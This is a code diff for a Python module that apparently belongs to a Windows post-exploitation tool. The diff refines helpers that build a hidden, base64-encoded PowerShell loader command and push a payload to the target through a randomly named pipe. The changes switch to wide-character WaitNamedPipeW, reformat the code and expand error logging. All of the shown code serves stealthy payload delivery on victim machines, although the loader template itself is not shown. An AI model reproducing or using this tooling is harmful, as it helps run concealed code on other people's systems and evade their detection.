@@ -13,7 +13,7 @@ import threading
 
 from io import open
 from ctypes import WinDLL, get_last_error
-from ctypes.wintypes import BOOL, LPSTR, DWORD
+from ctypes.wintypes import BOOL, LPWSTR, DWORD
 from time import sleep
 
 from hashlib import md5
@@ -23,10 +23,10 @@ if sys.version_info.major > 2:
 
 kernel32 = WinDLL('kernel32', use_last_error=True)
 
-WaitNamedPipe = kernel32.WaitNamedPipeA
+WaitNamedPipe = kernel32.WaitNamedPipeW
 WaitNamedPipe.restype = BOOL
 WaitNamedPipe.argtypes = (
-    LPSTR, DWORD
+    LPWSTR, DWORD
 )
 
 PIPE_LOADER_TEMPLATE = '''
@@ -45,12 +45,22 @@ $x.Close();
 PIPE_LOADER_CMD_TEMPLATE = '{powershell} -w hidden -EncodedCommand {cmd}'
 POWERSHELL_PATH = r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
 
+
 def generate_loader_cmd(size):
-    pipename = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in xrange(10))
+    pipename = ''.join(
+        random.choice(string.ascii_uppercase + string.digits)
+        for _ in xrange(10)
+    )
+
     encoded = base64.b64encode(PIPE_LOADER_TEMPLATE.strip().format(
         pipename=pipename, size=size).encode('utf-16le'))
-    cmd = PIPE_LOADER_CMD_TEMPLATE.format(powershell=POWERSHELL_PATH, cmd=encoded)
+
+    cmd = PIPE_LOADER_CMD_TEMPLATE.format(
+        powershell=POWERSHELL_PATH, cmd=encoded
+    )
+
     return cmd, pipename
+
 
 def push_payload(payload, timeout=90, log_cb=None):
     size = len(payload)
@@ -91,7 +101,11 @@ def push_payload(payload, timeout=90, log_cb=None):
 
         except Exception as e:
             if log_cb:
-                log_cb(False, 'Open/Push - Fail ({})'.format(e))
+                import traceback
+                exc_txt = traceback.format_exc()
+
+                log_cb(False, 'Open/Push - Fail ({} size={} type={})'.format(
+                    e, len(payload), type(payload)))
 
             failed = True
 
